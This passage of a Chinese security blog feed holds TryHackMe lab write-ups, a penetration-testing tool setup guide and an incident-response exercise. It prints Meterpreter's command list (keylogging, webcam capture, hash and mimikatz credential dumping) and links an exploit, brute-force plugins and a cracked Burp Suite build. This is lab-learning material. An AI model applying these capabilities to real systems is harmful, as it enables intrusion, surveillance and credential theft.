class="hljs-code">    sleep         Force Meterpreter to go quiet, then re-establish session</span><br><span class="hljs-code">    ssl_verify    Modify the SSL certificate verification setting</span><br><span class="hljs-code">    transport     Manage the transport mechanisms</span><br><span class="hljs-code">    use           Deprecated alias for &quot;load&quot;</span><br><span class="hljs-code">    uuid          Get the UUID for the current session</span><br><span class="hljs-code">    write         Writes data to a channel</span><br><br><br><span class="hljs-section">Stdapi: File system Commands</span><br><span class="hljs-section">============================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    cat           Read the contents of a file to the screen</span><br><span class="hljs-code">    cd            Change directory</span><br><span class="hljs-code">    checksum      Retrieve the checksum of a file</span><br><span class="hljs-code">    cp            Copy source to destination</span><br><span class="hljs-code">    del           Delete the specified file</span><br><span class="hljs-code">    dir           List files (alias for ls)</span><br><span class="hljs-code">    download      Download a file or directory</span><br><span class="hljs-code">    edit          Edit a file</span><br><span class="hljs-code">    getlwd        Print local working directory</span><br><span class="hljs-code">    getwd         Print working directory</span><br><span class="hljs-code">    lcat          Read the contents of a local file to the screen</span><br><span class="hljs-code">    lcd           Change local working directory</span><br><span class="hljs-code">    lls           List local files</span><br><span class="hljs-code">    lpwd          Print local working directory</span><br><span class="hljs-code">    ls            List files</span><br><span class="hljs-code">    mkdir         Make directory</span><br><span class="hljs-code">    mv            Move source to destination</span><br><span class="hljs-code">    pwd           Print working directory</span><br><span class="hljs-code">    rm            Delete the specified file</span><br><span class="hljs-code">    rmdir         Remove directory</span><br><span class="hljs-code">    search        Search for files</span><br><span class="hljs-code">    show_mount    List all mount points/logical drives</span><br><span class="hljs-code">    upload        Upload a file or directory</span><br><br><br><span class="hljs-section">Stdapi: Networking Commands</span><br><span class="hljs-section">===========================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    arp           Display the host ARP cache</span><br><span class="hljs-code">    getproxy      Display the current proxy configuration</span><br><span class="hljs-code">    ifconfig      Display interfaces</span><br><span class="hljs-code">    ipconfig      Display interfaces</span><br><span class="hljs-code">    netstat       Display the network connections</span><br><span class="hljs-code">    portfwd       Forward a local port to a remote service</span><br><span class="hljs-code">    resolve       Resolve a set of host names on the target</span><br><span class="hljs-code">    route         View and modify the routing table</span><br><br><br><span class="hljs-section">Stdapi: System Commands</span><br><span class="hljs-section">=======================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    clearev       Clear the event log</span><br><span class="hljs-code">    drop_token    Relinquishes any active impersonation token.</span><br><span class="hljs-code">    execute       Execute a command</span><br><span class="hljs-code">    getenv        Get one or more environment variable values</span><br><span class="hljs-code">    getpid        Get the current process identifier</span><br><span class="hljs-code">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="hljs-code">    getsid        Get the SID of the user that the server is running as</span><br><span class="hljs-code">    getuid        Get the user that the server is running as</span><br><span class="hljs-code">    kill          Terminate a process</span><br><span class="hljs-code">    localtime     Displays the target system local date and time</span><br><span class="hljs-code">    pgrep         Filter processes by name</span><br><span class="hljs-code">    pkill         Terminate processes by name</span><br><span class="hljs-code">    ps            List running processes</span><br><span class="hljs-code">    reboot        Reboots the remote computer</span><br><span class="hljs-code">    reg           Modify and interact with the remote registry</span><br><span class="hljs-code">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="hljs-code">    shell         Drop into a system command shell</span><br><span class="hljs-code">    shutdown      Shuts down the remote computer</span><br><span class="hljs-code">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="hljs-code">    suspend       Suspends or resumes a list of processes</span><br><span class="hljs-code">    sysinfo       Gets information about the remote system, such as OS</span><br><br><br><span class="hljs-section">Stdapi: User interface Commands</span><br><span class="hljs-section">===============================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    enumdesktops  List all accessible desktops and window stations</span><br><span class="hljs-code">    getdesktop    Get the current meterpreter desktop</span><br><span class="hljs-code">    idletime      Returns the number of seconds the remote user has been idle</span><br><span class="hljs-code">    keyboard_sen  Send keystrokes</span><br><span class="hljs-code">    d</span><br><span class="hljs-code">    keyevent      Send key events</span><br><span class="hljs-code">    keyscan_dump  Dump the keystroke buffer</span><br><span class="hljs-code">    keyscan_star  Start capturing keystrokes</span><br><span class="hljs-code">    t</span><br><span class="hljs-code">    keyscan_stop  Stop capturing keystrokes</span><br><span class="hljs-code">    mouse         Send mouse events</span><br><span class="hljs-code">    screenshare   Watch the remote user desktop in real time</span><br><span class="hljs-code">    screenshot    Grab a screenshot of the interactive desktop</span><br><span class="hljs-code">    setdesktop    Change the meterpreters current desktop</span><br><span class="hljs-code">    uictl         Control some of the user interface components</span><br><br><br><span class="hljs-section">Stdapi: Webcam Commands</span><br><span class="hljs-section">=======================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    record_mic    Record audio from the default microphone for X seconds</span><br><span class="hljs-code">    webcam_chat   Start a video chat</span><br><span class="hljs-code">    webcam_list   List webcams</span><br><span class="hljs-code">    webcam_snap   Take a snapshot from the specified webcam</span><br><span class="hljs-code">    webcam_strea  Play a video stream from the specified webcam</span><br><span class="hljs-code">    m</span><br><br><br><span class="hljs-section">Stdapi: Audio Output Commands</span><br><span class="hljs-section">=============================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    play          play a waveform audio file (.wav) on the target system</span><br><br><br><span class="hljs-section">Priv: Elevate Commands</span><br><span class="hljs-section">======================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    getsystem     Attempt to elevate your privilege to that of local system.</span><br><br><br><span class="hljs-section">Priv: Password database Commands</span><br><span class="hljs-section">================================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    hashdump      Dumps the contents of the SAM database</span><br><br><br><span class="hljs-section">Priv: Timestomp Commands</span><br><span class="hljs-section">========================</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    timestomp     Manipulate file MACE attributes</span><br><br><br><span class="hljs-section">Kiwi Commands</span><br><span class="hljs-section">=============</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    creds_all     Retrieve all credentials (parsed)</span><br><span class="hljs-code">    creds_kerber  Retrieve Kerberos creds (parsed)</span><br><span class="hljs-code">    os</span><br><span class="hljs-code">    creds_livess  Retrieve Live SSP creds</span><br><span class="hljs-code">    p</span><br><span class="hljs-code">    creds_msv     Retrieve LM/NTLM creds (parsed)</span><br><span class="hljs-code">    creds_ssp     Retrieve SSP creds</span><br><span class="hljs-code">    creds_tspkg   Retrieve TsPkg creds (parsed)</span><br><span class="hljs-code">    creds_wdiges  Retrieve WDigest creds (parsed)</span><br><span class="hljs-code">    t</span><br><span class="hljs-code">    dcsync        Retrieve user account information via DCSync (unparsed)</span><br><span class="hljs-code">    dcsync_ntlm   Retrieve user account NTLM hash, SID and RID via DCSync</span><br><span class="hljs-code">    golden_ticke  Create a golden kerberos ticket</span><br><span class="hljs-code">    t_create</span><br><span class="hljs-code">    kerberos_tic  List all kerberos tickets (unparsed)</span><br><span class="hljs-code">    ket_list</span><br><span class="hljs-code">    kerberos_tic  Purge any in-use kerberos tickets</span><br><span class="hljs-code">    ket_purge</span><br><span class="hljs-code">    kerberos_tic  Use a kerberos ticket</span><br><span class="hljs-code">    ket_use</span><br><span class="hljs-code">    kiwi_cmd      Execute an arbitary mimikatz command (unparsed)</span><br><span class="hljs-code">    lsa_dump_sam  Dump LSA SAM (unparsed)</span><br><span class="hljs-code">    lsa_dump_sec  Dump LSA secrets (unparsed)</span><br><span class="hljs-code">    rets</span><br><span class="hljs-code">    password_cha  Change the password/hash of a user</span><br><span class="hljs-code">    nge</span><br><span class="hljs-code">    wifi_list     List wifi profiles/creds for the current user</span><br><span class="hljs-code">    wifi_list_sh  List shared wifi profiles/creds (requires SYSTEM)</span><br><span class="hljs-code">    ared</span><br><br></code></pre></td></tr></table></figure><h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p><a href="https://www.exploit-db.com/exploits/568">Icecast 2.0.1 (Win32) - Remote Code Execution (1) - Windows remote Exploit (exploit-db.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY3-Basic Pentesting</title>
    <link href="/2024/06/17/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try-hack-me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY3-Basic-Pentesting/"/>
    <url>/2024/06/17/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try-hack-me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY3-Basic-Pentesting/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY3-Basic-Pentesting"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY3-Basic-Pentesting" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY3-Basic Pentesting"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY3-Basic Pentesting</h1><p><a href="https://tryhackme.com/r/room/basicpentestingjt">TryHackMe的 |基本渗透测试 — TryHackMe | Basic Pentesting</a></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337963.png" alt="image-20240320212602863"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337003.png" alt="image-20240320213259423"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337996.png" alt="image-20240320220300964"></p><p>(扫太慢了，后面补上的)</p><p>左为第二个问题答案，由开放端口判断，右边显示出第三个问题答案，development</p><p>然后我们因为开放了，139，445端口，可以猜想到有之前开放的samba</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337989.png" alt="image-20240320213741009"></p><p>samba连接上之后看到目录上有个staff.txt，十分可疑</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337988.png" alt="image-20240320213848085"></p><p>get命令提取下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337986.png" alt="image-20240320213914776"></p><p>可以看到一个Jan一个Kay</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337268.png" alt="image-20240320220433310"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337287.png" alt="image-20240320221139258"></p><p>(后来补上的)</p><p>不知道要扫到什么时候，作个小弊，搜到了答案armando</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337302.png" alt="image-20240320220744358"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337319.png" alt="image-20240320221118602"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337339.png" alt="image-20240320221716231"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337352.png" alt="image-20240320222603779"></p><p>找到Kay ssh的密钥</p><p>注意，这里复制一定要一整个都复制下去，不然一会儿ssh2john会无法解析文件</p><p>然后就创建一个文件，大多教程可能会采用nano，事实上都可以（手动创建个文件也行），我这里采用了vim</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337486.png" alt="image-20240320230143875"></p><p>大致流程这样既可</p><p>然后就是对hash值的破解</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337546.png" alt="image-20240320230333319"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337596.png" alt="image-20240320230624198"></p><p>这里记得chmod 600</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337655.png" alt="image-20240320230736259"></p><p>拿下最后的答案</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406171337683.png" alt="image-20240320230819789"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一个基础的靶场，开始先通过nmap获取端口信息，然后通过samba连接上目标，并获取关键文件，这些都是老知识，比较新的是ssh连接，例如对rsa的破解，ssh连接的一些小细节</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>挖洞前置-环境配置</title>
    <link href="/2024/06/17/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/06/17/%E6%8C%96%E6%B4%9E%E5%89%8D%E7%BD%AE-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置（如果我记得住且不懒的话持续更新）"><a href="#环境配置（如果我记得住且不懒的话持续更新）" class="headerlink" title="环境配置（如果我记得住且不懒的话持续更新）"></a>环境配置（如果我记得住且不懒的话持续更新）</h1><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>做web端的渗透测试，我们首先就要有一个好的浏览器，这里我推荐使用Firefox和Google，这里的建议是两个都配一配，一个不行就换另一个，这篇文章我将从google的角度进行配置，firefox大体相通，如果真的不想配很多很繁琐的，我这里也先直接推荐一个配好的版本</p><p><a href="https://mp.weixin.qq.com/s/AFwq_sLsMR0GcFABI__isg">渗透测试专用firefox浏览器 v2024.2最新版！！！ (qq.com)</a></p><p>下面正式开始</p><p>首先是一个插件下载网站，如果不懂得科学上网，我们的插件可以从这里下载</p><p><a href="https://www.crxsoso.com/">https://www.crxsoso.com/</a></p><p>下面这个是google扩展程序官网（<strong>需要魔法！</strong>）</p><p><a href="https://chromewebstore.google.com/category/extensions?utm_source=ext_sidebar&hl=zh-CN">https://chromewebstore.google.com/category/extensions?utm_source=ext_sidebar&amp;hl=zh-CN</a></p><p>先说说推荐哪些插件：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181048442.png" alt="image-20240618104842398"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181052867.png" alt="image-20240618105255056"></p><p>这个工具可以让我们很轻易地就能对资产做一些简单的信息收集，我们还能自己给它添加上fofa,hunter等的key</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181048654.png" alt="image-20240618104855611"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181053190.png" alt="image-20240618105334124"></p><p>这个用于快捷的有没有api接口泄露</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049688.png" alt="image-20240618104914665"></p><p>熟知ctf的对这个应该都不会陌生</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049625.png" alt="image-20240618104926586"></p><p>这个对于后续抓包非常重要，是用来调代理的</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049082.png" alt="image-20240618104935039"></p><p>对端口及一些可能的漏洞进行扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181049846.png" alt="image-20240618104945825"></p><p>扫描使用了什么组件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181050051.png" alt="image-20240618105001015"></p><p>功能较多</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181050016.png" alt="image-20240618105012977"></p><p>微步的威胁检测</p><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><p>在软件安装之前记得要先配置jdk环境</p><p><a href="https://www.oracle.com/cn/java/technologies/downloads/">Java Downloads | Oracle 中国</a></p><p>这里不展开讲了哈</p><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><p><a href="https://www.52pojie.cn/thread-1544866-1-1.html">BurpSuite v2024.5.1汉化无cmd框版（2024.06.09更新） - 『逆向资源区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p>打开网址下载最新版本即可</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170252967.png" alt="image-20240617025156894"></p><p>解压到文件夹可以看到这些，如果之前安装过burp的可以先点击一下清楚许可证和数据,点开文件夹中的Start.VBS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170255605.png" alt="image-20240617025528568"></p><p>全部勾选之后点击run就会自动运行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170255011.png" alt="image-20240617025555988"></p><p>输入上一张图中的license</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170256167.png" alt="image-20240617025656097"></p><p>然后点击继续</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170257756.png" alt="image-20240617025731727"></p><p>选择手动激活</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170258448.png" alt="image-20240617025811392"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170258571.png" alt="image-20240617025847507"></p><p>然后点击继续即可</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170259978.png" alt="image-20240617025907953"></p><p>到此软件安装完成</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170300379.png" alt="image-20240617030051344"></p><p>一般来说我们到这里选择临时文件继续即可</p><h3 id="默认设置"><a href="#默认设置" class="headerlink" title="默认设置"></a>默认设置</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170302402.png" alt="image-20240617030207320"></p><p>打开软件长这样，我们基本上最常用的就是代理(proxy),Intruder(网上翻译叫侵入者),重放器(Repeater)，这里我们先着重看看代理，burp作为一款抓取数据包的工具，调好代理尤其重要</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406170306053.png" alt="image-20240617030629013"></p><p>刚打开软件它就是空的，什么都没有，这是因为我们还没有打开浏览器（或者我们的网页没有走burp抓取的端口），这里我们要做两件事</p><h4 id="1-配置代理"><a href="#1-配置代理" class="headerlink" title="1:配置代理"></a>1:配置代理</h4><h4 id="2-下载证书"><a href="#2-下载证书" class="headerlink" title="2:下载证书"></a>2:下载证书</h4><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181952849.png" alt="image-20240618195216820"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181952114.png" alt="image-20240618195257084"></p><p>如果不喜欢8080可以点上面那个添加换上自己喜欢的端口，但那个不是本次重点，我们要导出证书</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181954426.png" alt="image-20240618195440393"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181957662.png" alt="image-20240618195712592"></p><p>先随便找个地方存着，名字叫什么无所谓，但一定要有der的后缀</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181958069.png" alt="image-20240618195808029"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181958362.png" alt="image-20240618195843322"></p><p>然后就是打开浏览器</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181959236.png" alt="image-20240618195930184"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181959754.png" alt="image-20240618195955694"></p><p>直接搜索证书，可以看到安全那里弹窗了，点进去</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182000375.png" alt="image-20240618200035257"></p><p>往下滑可以看到管理证书，点进去</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182001124.png" alt="image-20240618200143062"></p><p>点击导入</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182002168.png" alt="image-20240618200228099"></p><p>下一步</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182002785.png" alt="image-20240618200245723"></p><p>浏览</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182003861.png" alt="image-20240618200327788"></p><p>先点击右下角，然后就能看到我们的证书</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182004320.png" alt="image-20240618200403543"></p><p>选自动选择然后下一步即可</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406182004024.png" alt="image-20240618200436985"></p><h4 id="3-其它配置"><a href="#3-其它配置" class="headerlink" title="3.其它配置"></a>3.其它配置</h4><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181946975.png" alt="image-20240618194608816"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181946349.png" alt="image-20240618194623318"></p><p>这里建议一定要把字体改一下，这里我建议改这个哈（不然的话很容易光标错位，用起来很难受）</p><h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><h5 id="Jython环境安装"><a href="#Jython环境安装" class="headerlink" title="Jython环境安装"></a>Jython环境安装</h5><p>在bp中我们有些插件是由python编写的，但是由于bp是基础java开发，所以我们在装python插件前，需要先装上jython环境</p><p><a href="https://www.jython.org/download.html">Downloads | Jython</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191639528.png" alt="image-20240619163905348"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191643789.png" alt="image-20240619164324768"></p><p>下完长这样，我们不用点他，打开我们的bp</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191648009.png" alt="image-20240619164845942"></p><p>点击选择文件选到我们下载好的jar包</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406191650484.png" alt="image-20240619165011454"></p><p>到这里为止基础环境大体完成，由于插件很多，我不一一演示怎么安装，这里就推荐几个插件，以及我认为可能会存在问题的地方</p><p><a href="https://github.com/smxiazi/xia_Yue">smxiazi&#x2F;xia_Yue: burp 插件 xia_Yue（瞎越） 主要用于测试越权、未授权 (github.com)</a></p><p><a href="https://github.com/f0ng/captcha-killer-modified">f0ng&#x2F;captcha-killer-modified: captcha-killer的修改版，支持关键词识别base64编码的图片，添加免费ocr库，用于验证码爆破，适配新版Burpsuite (github.com)</a></p><p>爆破验证码还要配合打开</p><p><a href="https://github.com/f0ng/captcha-killer-modified/blob/main/codereg.py">captcha-killer-modified&#x2F;codereg.py at main · f0ng&#x2F;captcha-killer-modified (github.com)</a></p><p><a href="https://github.com/smxiazi/xia_Liao/releases">Releases · smxiazi&#x2F;xia_Liao (github.com)</a></p><p>伪造身份</p><h2 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h2><h2 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h2><p><a href="https://www.yaklang.io/products/intro/">Yakit: 集成化单兵安全能力平台 | Yak Program Language (yaklang.io)</a></p><h2 id="proxifire"><a href="#proxifire" class="headerlink" title="proxifire"></a>proxifire</h2><p><a href="https://blog.zgsec.cn/archives/278.html">渗透必备：使用Proxifier玩转代理 - AabyssZG’s Blog (zgsec.cn)</a></p><p>直接看这个</p><h2 id="Utools"><a href="#Utools" class="headerlink" title="Utools"></a>Utools</h2><p><a href="https://u.tools/">uTools官网 - 新一代效率工具平台</a></p>]]></content>
    
    
    <categories>
      
      <category>挖洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>挖洞</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>知攻善防-应急响应-web-1</title>
    <link href="/2024/06/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94web-1/"/>
    <url>/2024/06/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94web-1/</url>
    
    <content type="html"><![CDATA[<h1 id="知攻善防-应急响应-web-1"><a href="#知攻善防-应急响应-web-1" class="headerlink" title="知攻善防-应急响应-web-1"></a>知攻善防-应急响应-web-1</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210651.png" alt="image-20240323190457439"></p><p>打开如图</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210522.png"></p><p>本次任务如上</p><p>因为可以看到桌面只有三个图标，我们先看看回收站</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210577.png" alt="image-20240323192240460"></p><p>再看看phpstudy</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210540.png" alt="image-20240323190722914"></p><p>可以看到有一个网站，具体目录如上，再看题目是看攻击者shell密码，这里应该是被种了个后门木马</p><p>打开网站看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210434.png" alt="image-20240323193007178"></p><p>我们把D盾导入</p><p>并进行扫描，扫描的时候发现win自带的安全中心弹消息，发现他直接把shell给删了（D盾直接什么都没扫到）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210109.png" alt="image-20240323192743660"></p><p>这里为了不影响我们后续操作，先复原回去，并把安全中心关了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161210404.png" alt="image-20240323192848757"></p><p>可以看到默认连接密码rebeyond，也就是冰蝎</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211600.png" alt="image-20240323193329845"></p><p>第一题答案</p><p>然后是要找攻击者ip，一般在日志中找，我们打开apache日志文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211219.png" alt="image-20240323193516628"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211655.png" alt="image-20240323193703186"></p><p>这里我们挑选文件大小比较大的这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161213266.png" alt="image-20240323193615103"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211315.png" alt="image-20240323193732211"></p><p>第二题也解出来了</p><p>第三题问隐藏账户名称，我们首先查看电脑上有哪些用户</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211278.png" alt="image-20240323194419342"></p><p>这里直接可以看到一个hack168$</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211808.png" alt="image-20240323194450750"></p><p>(也可以用日志分析工具，看注册表，计算机管理等方法)</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211813.png" alt="image-20240323194831453"></p><p>HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users&#x2F;Names</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211126.png" alt="image-20240323194802642"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161213631.png" alt="image-20240323194919646"></p><p>第四题找矿池域名</p><p>我们在刚才文件管理处找找有没有痕迹</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211112.png" alt="image-20240323195515041"></p><p>可以看到有个很像是挖矿工具的文件</p><p>这里我们直接丢到奇安信的情报沙箱进行分析</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211089.png" alt="image-20240323200639804"></p><p>（找了很久没找到域名，只有一个ip）</p><p>于是我们进行python反编译</p><p><a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor (github.com)</a></p><p>用到这个工具</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211847.png" alt="image-20240323202214146"></p><p>再到反编译出的文件中找到这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211507.png" alt="image-20240323202325249"></p><p><a href="https://www.toolkk.com/tools/pyc-decomplie">pyc反编译 - 工具匠 (toolkk.com)</a></p><p>在这个网站进行反编译之后可以看到如下：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211760.png" alt="image-20240323202607227"></p><p>wakuang.zhigongshanfang.top</p><p>最后的答案</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406161211786.png" alt=" "></p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>应急响应</tag>
